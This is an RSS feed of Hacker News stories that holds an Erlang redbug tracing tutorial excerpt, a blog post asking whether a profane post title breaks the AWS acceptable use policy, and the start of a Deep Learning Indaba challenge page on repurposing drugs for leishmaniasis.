<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 04 Jul 2020 20:16:45 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 04 Jul 2020 20:16:45 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[The BEAM Book (2017)]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 15 (<a href="https://news.ycombinator.com/item?id=23718278">thread link</a>) | @hazbo
<br/>
July 2, 2020 | https://blog.stenmans.org/theBeamBook/ | <a href="https://web.archive.org/web/*/https://blog.stenmans.org/theBeamBook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Redbug is safe to be used in production, thanks to a self-protecting
mechanism against overload, which kills the tool in case too many
tracing messages are sent, preventing the Erlang node to become
overloaded. Let’s see it in action:</p><div>
<div>
<pre><code data-lang="erlang"><span>$ </span><span>erl</span>
<span>Erlang</span><span>/</span><span>OTP</span> <span>19</span> <span>[</span><span>erts</span><span>-</span><span>8</span><span>.</span><span>2</span><span>]</span> <span>[...]</span>

<span>Eshell</span> <span>V8</span><span>.</span><span>2</span> <span>(</span><span>abort</span> <span>with</span> <span>^</span><span>G</span><span>)</span>
<span>1</span><span>&gt;</span> <span>l</span><span>(</span><span>redbug</span><span>).</span> <i data-value="1"></i><b>(1)</b>
<span>{</span><span>module</span><span>,</span><span>redbug</span><span>}</span>
<span>2</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1"</span><span>).</span> <i data-value="2"></i><b>(2)</b>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span>
<span>3</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]</span>

<span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2}) <i data-value="3"></i><b>(3)</b>
% lists:sort([3,2,1])
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span> <i data-value="4"></i><b>(4)</b></code></pre>
</div>
</div><p>Let’s now look at the actual message produced by redbug. By default
messages are printed to the standard output, but it’s also possible to
dump them to file:</p><div>
<div>
<pre><code data-lang="erlang"><span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2})
</span><span>%</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>])</span></code></pre>
</div>
</div><p>Depending on the version of redbug you are using, you may get a
slightly different message. In this case, the message is split across
two lines. The first line contains a <strong>timestamp</strong>, the <strong>Process Identifier</strong>
(or <em>PID</em>) of the Erlang process which invoked the function and the
<strong>caller</strong> function. The second line contains the function called,
including the input arguments. Both lines are prepended with a <code>%</code>,
which reminds us of the syntax for Erlang comments.</p><p>We can also ask Redbug to produce an extra message for the return
value. This is achieved using the following syntax:</p><div>
<div>
<pre><code data-lang="erlang"><span>4</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>Let’s invoke the <code>lists:sort/1</code> function again. This time the output
from redbug is slightly different.</p><div>
<div>
<pre><code data-lang="erlang"><span>5</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]</span>

<span>% 15:35:52 &lt;0.31.0&gt;({erlang,apply,2})
% lists:sort([3,2,1])
</span>
<span>% 15:35:52 &lt;0.31.0&gt;({erlang,apply,2})
% lists:sort/1 -&gt; [1,2,3]
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>In this case two messages are produced, one when entering the function
and one when leaving the same function.</p><p>When dealing with real code, trace messages can be complex and
therefore hardly readable. Let’s see what happens if we try to trace
the sorting of a list containing 10.000 elements.</p><div>
<div>
<pre><code data-lang="erlang"><span>6</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>(</span><span>lists</span><span>:</span><span>seq</span><span>(</span><span>10000</span><span>,</span> <span>1</span><span>,</span> <span>-</span><span>1</span><span>)).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>,</span><span>5</span><span>,</span><span>6</span><span>,</span><span>7</span><span>,</span><span>8</span><span>,</span><span>9</span><span>,</span><span>10</span><span>,</span><span>11</span><span>,</span><span>12</span><span>,</span><span>13</span><span>,</span><span>14</span><span>,</span><span>15</span><span>,</span><span>16</span><span>,</span><span>17</span><span>,</span><span>18</span><span>,</span><span>19</span><span>,</span><span>20</span><span>,</span><span>21</span><span>,</span><span>22</span><span>,</span>
<span>23</span><span>,</span><span>24</span><span>,</span><span>25</span><span>,</span><span>26</span><span>,</span><span>27</span><span>,</span><span>28</span><span>,</span><span>29</span><span>|...]</span>

<span>% 15:48:42.208 &lt;0.77.0&gt;({erlang,apply,2})
% lists:sort([10000,9999,9998,9997,9996,9995,9994,9993,9992,9991,9990,9989,9988,9987,9986,
% 9985,9984,9983,9982,9981,9980,9979,9978,9977,9976,9975,9974,9973,9972,9971,
% 9970,9969,9968,9967,9966,9965,9964,9963,9962,9961,9960,9959,9958,9957,9956,
% 9955,9954,9953,9952,9951,9950,9949,9948,9947,9946,9945,9944,9943,9942,9941,
% 9940,9939,9938,9937,9936,9935,9934,9933,9932,9931,9930,9929,9928,9927,9926,
% 9925,9924,9923,9922,9921,9920,9919,9918,9917,9916,9915,9914,9913,9912,9911,
% [...]
% 84,83,82,81,80,79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,62,61,60,
% 59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,35,
% 34,33,32,31,30,29,28,27,26,25,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,
% 8,7,6,5,4,3,2,1])
</span>
<span>% 15:48:42.210 &lt;0.77.0&gt;({erlang,apply,2}) lists:sort/1 -&gt;
% [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,
% 23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,
% 42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,
% 61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,
% 80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,
% 99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,
% [...]
% 9951,9952,9953,9954,9955,9956,9957,9958,9959,9960,9961,
% 9962,9963,9964,9965,9966,9967,9968,9969,9970,9971,9972,
% 9973,9974,9975,9976,9977,9978,9979,9980,9981,9982,9983,
% 9984,9985,9986,9987,9988,9989,9990,9991,9992,9993,9994,
% 9995,9996,9997,9998,9999,10000]
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>Most of the output has been truncated here, but you should get the
idea. To improve things, we can use a couple of redbug options.  The
option <code>{arity, true}</code> instructs redbug to only display the number of
input arguments for the given function, instead of their actual
value. The <code>{print_return, false}</code> option tells Redbug not to display
the return value of the function call, and to display a <code>…​</code>  symbol,
instead. Let’s see these options in action.</p><div>
<div>
<pre><code data-lang="erlang"><span>7</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>,</span> <span>[{</span><span>arity</span><span>,</span> <span>true</span><span>},</span> <span>{</span><span>print_return</span><span>,</span> <span>false</span><span>}]).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span>

<span>8</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>(</span><span>lists</span><span>:</span><span>seq</span><span>(</span><span>10000</span><span>,</span> <span>1</span><span>,</span> <span>-</span><span>1</span><span>)).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>,</span><span>5</span><span>,</span><span>6</span><span>,</span><span>7</span><span>,</span><span>8</span><span>,</span><span>9</span><span>,</span><span>10</span><span>,</span><span>11</span><span>,</span><span>12</span><span>,</span><span>13</span><span>,</span><span>14</span><span>,</span><span>15</span><span>,</span><span>16</span><span>,</span><span>17</span><span>,</span><span>18</span><span>,</span><span>19</span><span>,</span><span>20</span><span>,</span><span>21</span><span>,</span><span>22</span><span>,</span>
<span>23</span><span>,</span><span>24</span><span>,</span><span>25</span><span>,</span><span>26</span><span>,</span><span>27</span><span>,</span><span>28</span><span>,</span><span>29</span><span>|...]</span>

<span>% 15:55:32 &lt;0.77.0&gt;({erlang,apply,2})
% lists:sort/1
</span>
<span>% 15:55:32 &lt;0.77.0&gt;({erlang,apply,2})
% lists:sort/1 -&gt; '...'
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>By default, redbug stops after 15 seconds or after 10 messages are
received. Those values are a safe default, but they are rarely
enough. You can bump those limits by using the <code>time</code> and <code>msgs</code>
options. <code>time</code> is expressed in milliseconds.</p><div>
<div>
<pre><code data-lang="erlang"><span>9</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>,</span> <span>[{</span><span>arity</span><span>,</span> <span>true</span><span>},</span> <span>{</span><span>print_return</span><span>,</span> <span>false</span><span>},</span> <span>{</span><span>time</span><span>,</span> <span>60</span> <span>*</span> <span>1000</span><span>},</span> <span>{</span><span>msgs</span><span>,</span> <span>100</span><span>}]).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>We can also activate redbug for several function calls
simultaneously. Let’s enable tracing for both functions <code>lists:sort/1</code>
and <code>lists:sort_1/3</code> (an internal function used by the former):</p><div>
<div>
<pre><code data-lang="erlang"><span>10</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort/1-&gt;return"</span><span>,</span> <span>"lists:sort_1/3-&gt;return"</span><span>]).</span>
<span>{</span><span>30</span><span>,</span><span>2</span><span>}</span>

<span>11</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>4</span><span>,</span><span>4</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>4</span><span>,</span><span>4</span><span>]</span>

<span>% 18:39:26 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort([4,4,2,1])
</span>
<span>% 18:39:26 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort_1(4, [2,1], [4])
</span>
<span>% 18:39:26 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort_1/3 -&gt; [1,2,4,4]
</span>
<span>% 18:39:26 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort/1 -&gt; [1,2,4,4]
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>2</span></code></pre>
</div>
</div><p>Last but not least, redbug offers the ability to only display results
for matching input arguments. This is when the syntax looks a bit like
magic.</p><div>
<div>
<pre><code data-lang="erlang"><span>12</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort([1,2,5])-&gt;return"</span><span>]).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span>

<span>13</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>4</span><span>,</span><span>4</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>4</span><span>,</span><span>4</span><span>]</span>

<span>14</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>1</span><span>,</span><span>2</span><span>,</span><span>5</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>5</span><span>]</span>

<span>% 18:45:27 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort([1,2,5])
</span>
<span>% 18:45:27 &lt;0.32.0&gt;({erlang,apply,2})
% lists:sort/1 -&gt; [1,2,5]
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>In the above example, we are telling redbug that we are only
interested in function calls to the <code>lists:sort/1</code> function when the
input arguments is the list <code>[1,2,5]</code>. This allows us to remove a huge
amount of noise in the case our target function is used by many actors
at the same time and we are only interested in a specific use case.
Oh, and don’t forget that you can use the underscore as a wildcard:</p><div>
<div>
<pre><code data-lang="erlang"><span>15</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort([1,_,5])-&gt;return"</span><span>]).</span>  <span>{</span><span>30</span><span>,</span><span>1</span><span>}</span>

<span>16</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>1</span><span>,</span><span>2</span><span>,</span><span>5</span><span>]).</span>  <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>5</span><span>]</span>

<span>% 18:49:07 &lt;0.32.0&gt;({erlang,apply,2}) lists:sort([1,2,5])
</span>
<span>% 18:49:07 &lt;0.32.0&gt;({erlang,apply,2}) lists:sort/1 -&gt; [1,2,5]
</span>
<span>17</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>1</span><span>,</span><span>4</span><span>,</span><span>5</span><span>]).</span>  <span>[</span><span>1</span><span>,</span><span>4</span><span>,</span><span>5</span><span>]</span>

<span>% 18:49:09 &lt;0.32.0&gt;({erlang,apply,2}) lists:sort([1,4,5])
</span>
<span>% 18:49:09 &lt;0.32.0&gt;({erlang,apply,2}) lists:sort/1 -&gt; [1,4,5] redbug
</span><span>%</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>2</span></code></pre>
</div>
</div><p>This section does not pretend to be a comprehensive guide to redbug,
but it should be enough to get you going. To get a full list of the
available options for redbug, you can ask the tool itself:</p></div>]]>
            </description>
            <link>https://blog.stenmans.org/theBeamBook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23718278</guid>
            <pubDate>Thu, 02 Jul 2020 21:30:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does saying “Fuck You AWS” constitute offensive content?]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 102 (<a href="https://news.ycombinator.com/item?id=23717254">thread link</a>) | @jmdeon
<br/>
July 2, 2020 | http://thoughts.josephdeon.me/2020/07/02/fuck-you-aws.html | <a href="https://web.archive.org/web/*/http://thoughts.josephdeon.me/2020/07/02/fuck-you-aws.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="http://thoughts.josephdeon.me/assets/canary.png"></p>
<p><br>
I actually quite like AWS and its offerings. I’m making this post because I’m genuinely curious
how to interpret the <a href="https://aws.amazon.com/aup/">AWS Acceptable Use Policy</a>. The static content for this blog is hosted within an
AWS S3 bucket. Does saying “Fuck You AWS” constitute offensive content?</p>

<p>The section titled ‘No Illegal, Harmful, or Offensive Use or Content’ says:</p>

<blockquote>
  <p>You may not use, or encourage, promote, facilitate or instruct others to use, the Services or AWS Site for any illegal, harmful, fraudulent, infringing or offensive use, or to transmit, store, display, distribute or otherwise make available content that is illegal, harmful, fraudulent, infringing or offensive. Prohibited activities or content include:</p>
</blockquote>

<blockquote>
  <p>Offensive Content. Content that is defamatory, obscene, abusive, invasive of privacy, or otherwise objectionable, including content that constitutes child pornography, relates to bestiality, or depicts non-consensual sex acts.</p>
</blockquote>

<p>“Otherwise objectionable” seems to cast a very wide net.
One of my <a href="http://thoughts.josephdeon.me/2020/07/01/hello-weblog.html">three goals</a> for self hosting this blog was ownership. To me part of
ownership is being able to express myself freely. I hoped that meant as
long as I worked within the confines of the law I would be in the clear.</p>

<p>If this post gets removed then I know I have not fully achieved my ownership goal and it
might be time to just host on a pi.</p>

<p><br>
P.S. I posted this to hackernews. It made it to the front page and generated <a href="https://news.ycombinator.com/item?id=23717254">some discussion</a>.</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>http://thoughts.josephdeon.me/2020/07/02/fuck-you-aws.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23717254</guid>
            <pubDate>Thu, 02 Jul 2020 19:49:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indaba grand challenge: curing Leishmaniasis, a neglected disease]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 7 (<a href="https://news.ycombinator.com/item?id=23715643">thread link</a>) | @adsodemelk
<br/>
July 2, 2020 | https://deeplearningindaba.com/grand-challenges/leishmaniasis/ | <a href="https://web.archive.org/web/*/https://deeplearningindaba.com/grand-challenges/leishmaniasis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
			<div id="main">
				<div id="content">
					
					<div>
						<div>
							<div>
								

<blockquote>
<p><strong>Join the live stream for the #IndabaGrandChallenge kickoff meeting on YouTube  on Tuesday 30 June 3pm Accra,Dakar (UTC) | 4pm Abuja,Kinshasa,Yaounde | 5pm Johannesburg,Lilongwe | 6pm Nairobi, Kigali</strong>. </p>
<p><cite><strong><a href="https://www.youtube.com/c/deeplearningindaba/live">https://www.youtube.com/c/deeplearningindaba/live</a></strong></cite></p></blockquote>
<hr>
<p>Leishmaniasis is a <a href="https://www.dndi.org/diseases-projects/leishmaniasis/">neglected disease</a>. As a disease of poverty, it has historically received <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3530408/">limited funding</a> for discovery, development and delivery of new tools. Current treatment is costly, lengthy, painful and sometimes toxic. Like a handful of similar diseases, it is the scourge of whole regions affected by them, because we still miss cheap, safe and effective cures for them.</p>
<p>At the same time, new drug candidates are being developed and old ones are being tested every day. Today, millions of drug activity assays are available at the press of a button. In this Indaba Grand Challenge, we dare to ask you to help identify amongst the already known, tested and (often) approved drugs, potential cures for different forms of leishmaniasis.</p>
<h2>Leishmaniasis</h2>
<figure>
<p>
<iframe title="KILLER DISEASES | How Leishmaniasis Affects the Body" width="1200" height="675" src="https://www.youtube.com/embed/ABgLFFOO1ek?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>
</figure>
<p>Humanity has been remarkably successful in curing most of communicable diseases, be it of bacterial or viral origin. However, there remains a whole group of diseases that largely evade successful treatment – the ones transmitted by parasites. Large number of them is caused by a group of small, single-celled animals named <em><a href="https://www.dndi.org/wp-content/uploads/2018/12/Rao_Drugdiscoverykinetoplastiddiseases_ACSInfectiousDiseases_2019.pdf">kinetoplastids</a>. </em>They cause such diseases as African sleeping sickness (caused by <em>Trypanosoma brucei</em>), Chagas disease (<em>Trypanosoma cruzii</em>) and&nbsp; Leishmaniasis (different <em>Leishmania</em> species). </p>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2.jpg 959w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2-300x163.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2-768x417.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2-103x56.jpg 103w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis2-285x155.jpg 285w" sizes="(max-width: 959px) 100vw, 959px"><figcaption> Child with post-kala-azar-dermal leishmaniasis in old Fangak  County, South Sudan. The area suffered  severe visceral leishmaniasis  outbreaks from 2009 to 2012. Source: WHO</figcaption></figure>
<p>Leishmaniases (as it is a whole group of diseases), are spread by bites of sandflies and readily communicated between animals (such as dogs). Out of 30 species that attack animals, 21 affect humans. There are more than 350 million people in nearly 90 countries, that live in areas where leishmaniasis is common. Around 90% of its most dangerous variant – visceral leishmaniasis –&nbsp; is recorded&nbsp; in Bangladesh, Nepal, Sudan and Brazil, but disease is prevalent also in Mexico, South and Central America, Asia (excluding the South-East Asia), Middle East, southern Europe and Africa (in particular North and East Africa) .</p>
<div>
<figure><a href="https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba.png" target="_blank" rel="noreferrer noopener"><img src="https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-1024x599.png" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-1024x599.png 1024w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-300x176.png 300w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-768x449.png 768w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-1536x899.png 1536w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-2048x1198.png 2048w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-96x56.png 96w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba-265x155.png 265w, https://deeplearningindaba.com/wp-content/uploads/2020/06/leishmaniasis-map-indaba.png 6460w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>
</div>
<p>Every year approximately 12 million people are afflicted with the disease, with over 2 million new cases each year, most of which is a cutaneous (skin) leishmaniasis (nearly 1.5 million), but nearly 25% comprises the most lethal, visceral variant. Parasite suppresses the host’s immune system to avoid eradication, which often leads to frequently lethal secondary respiratory infections.&nbsp; Yearly, approximately 50 thousand people die worldwide because of <em>Leishmania </em>caused diseases.  </p>
<p>Visceral leishmaniasis causes swelling, malaise, wasting, damages spleen and liver, as well as leads to characteristic graying of skin (hence the name <em>black fever</em>). The fever caused by the disease lasts for more than two weeks and does not abate with antimalarial drugs. The cutaneous type makes for wide-spread sores that can take over a year to heal, and lead to necrosis (dying of tissue). It leads to scars on the face, neck, arms and legs. The third, mucocutaneous type causes both skin and mucosal ulcers, leading to the damage of soft tissues and cartilage, predominantly of nose and mouth area. All types tend to co-occur with AIDS (approximately 1 in 60 AIDS patients in south of France suffers from leishmaniasis).</p>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-1024x683.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-1024x683.jpg 1024w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-300x200.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-768x512.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-1536x1024.jpg 1536w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-2048x1365.jpg 2048w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-84x56.jpg 84w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-233x155.jpg 233w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-600x400.jpg 600w, https://deeplearningindaba.com/wp-content/uploads/2020/06/Viscerial_Leishmaniasis_hr-scaled.jpg 2560w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption> Patient with post-kala-azar-dermal leishmaniasis. Was earlier  treated and cured for visceral leishmaniasis. Libo Kemkem district,  Ethiopia.  Source: WHO<br></figcaption></figure>
<p> The treatment for visceral leishmaniasis is problematic and relies mostly on antibiotics, which have a variable success rate. The most commonly used non-antibiotic drugs, containing pentavalent antimony (such as sodium stibogluconate or meglumine antimonate) are toxic to the heart, kidneys, pancreas and bone marrow of the patient, leading to headaches, abdominal issues, vomiting and low levels of blood platelets. They also require a month-long treatment through injections, as medication does not work well if taken by mouth. There is no safe treatment for cutaneous leishmaniasis, that would work dependably, with fluconazole (an antifungal medication) and pentamidine (an antimicrobial used for other kinetoplastid diseases) being the most promising support medications. Miltefosine, the first promising oral treatment for visceral leishmaniasis, tends to be effective for cutaneous form, but has limited use, as it is known to cause birth defects. </p>
<p>In the recent years a massive drug discovery campaign has led to discovery of a new drug (codenamed GNF6702) and its analog (a new, improved version, named NITD689), which affect parasites ability to degrade unnecessary and damaged proteins. While these drugs seem to work against a wide range of pathogens (including these causing African sleeping sickness, Chagas disease and visceral leishmaniasis), they are not effective against the other leishmaniases. Additionally, there is an emerging mutation among the parasites, that already now renders the drug ineffective. Therefore, even though it is currently successful in the clinical trials, it will most likely not lead to the eradication of the disease.&nbsp;  </p>
<p>There is a dire need for a new, safe therapy for kinetoplastis, one that can be administered earlier, with lesser likelihood of bothersome side effects, one that could eradicate these diseases once and for all. Finding this therapy is the goal of this Indaba Grand Challenge, and literally lives are at stake. The approach to identify potential cure candidates is drug repurposing. </p>
<h2>What is Drug Repurposing?</h2>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg 910w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-300x198.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-768x508.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-85x56.jpg 85w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-234x155.jpg 234w" sizes="(max-width: 910px) 100vw, 910px"><figcaption>Photo Credit: pixabay.com</figcaption></figure>
<p>Drug repurposing is the act of researching if an existing drug can be used for new therapeutic purposes. It’s something that has been done for centuries. A large amount of medications on the market right now are used for multiple purposes: for instance, aspirin is a pain reliever and also a blood thinner, ibuprofen is also used for pain relief, and for reducing inflammations.</p>
<p>The high cost of research and development involved in finding new drugs means that most of these will be targeted to “First World” countries to generate returns.</p>
<p>For “neglected diseases” or “tropical diseases”, drug repurposing is used as a sort of universal strategy: it lowers the costs of research and production and the time needed for clinic trials, which is why you’ll find that many of these diseases use medication that was originally used for other illnesses.</p>
<h2>The Challenge </h2>
<p>Drug discovery methods and pipelines are well described and modular. Each can be decomposed into smaller pieces, which can be rearranged and modified. All of these pipelines rely heavily on knowledge representation, pattern detection and building of statistical models.</p>
<p>The goal of this Indaba Grand Challenge is to, through the use of standard techniques and publicly available data on drugs, drug targets and kinetoplastids (parasites causing amongst other leishmaniasis), identify either:</p>
<ul>
<li>Compounds among known, approved drugs which can target known drug targets in <em>Leishmania </em>(especially one of the 15 species known to cause the cutaneous type of disease)<em> </em>in addition to their official use.</li>
<li>Compounds among known, approved drugs with sufficiently similar targets in the goal organisms to the targets in kinetoplastids.</li>
</ul>
<p>Importantly, the verification of a drug-target interaction is possible and routinely done <em>in silico</em>. However, not all drug-target combinations can be verified, due to sheer combinatorial expansion and limited computational resources. In addition, the identification of similarities and analogies between known experimental data is far from trivial and, despite the existence of numerous approaches, cannot be solved by one statistical technique alone.</p>
<p>By launching this Grand Challenge, and true to the core values of Deep Learning Indaba, we aim to build a <strong>collaborative effort</strong>, joining experts and enthusiasts in machine learning and software engineering, with doctors, epidemiologists, medicinal chemists and policy experts, to create a <strong>synergistic effect at scale</strong>. Our vision, if it becomes true, is one where interesting discoveries of the community are taken up by the experts, and conclusions of the experts are fed back to the community to iteratively improve on its findings and make breakthroughs possible. <strong>No single person can do it perfectly, but through a joint effort, together we can. </strong></p>
<h2> Challenge Specs </h2>
<p><strong>Goal:</strong> Propose a new treatment, comprising an <em>Leishmania </em>protein (either from a defined species, or a protein present in the proteome of one or more of the <em>Leishmania </em>species) and a small molecule (or set of small molecules). Submission can be specified as:</p>
<ul>
<li>Small molecule (SMILES/SMARTS string or SDF file) and a protein name</li>
<li>PDB file with a structure of a target and a bound small molecule</li>
</ul>
<p><strong>Available resources: </strong>We have put together a list of available resources and additional material <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/resources/" target="_blank">here</a>.</p>

<h2>Who can apply?</h2>

<p>We invite you to join this initiative and help put an end to Leishmaniasis. We need your involvement, especially if, you are: </p>
<ul>
<li><strong>Data science</strong> or <strong>Machine Learning</strong> expert or enthusiast: we have the data, tools, benchmarks and everything you need to know to attack this problem. Our community needs your data wrangling skills. If you feel up for a challenge, apply here!</li>
<li><strong>Bioinformatics</strong> and <strong>Cheminformatics</strong> people: in addition to the resources, data and standardized protocols, we have a community, which can help you go the final mile from a great protocol to a great candidate. We need your expertise in translating life into bytes. If you can help, please apply here!</li>
